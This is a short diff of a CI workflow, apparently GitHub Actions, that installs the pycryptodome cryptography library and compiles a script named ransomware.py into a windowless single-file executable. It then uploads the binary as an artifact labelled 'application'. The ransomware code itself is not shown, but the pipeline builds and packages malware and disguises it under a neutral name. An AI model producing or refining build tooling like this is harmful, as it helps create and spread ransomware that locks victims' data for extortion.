@@ -19,7 +19,9 @@ jobs:
         with:
           python-version: '3.x'
       - run: pip install pyinstaller
-      - run: pyinstaller --onefile --noconsole ransomware.py
+      - run: |
+          pip install pycryptodome
+          pyinstaller --onefile --noconsole ransomware.py
       - uses: actions/upload-artifact@v4
         with:
           name: application
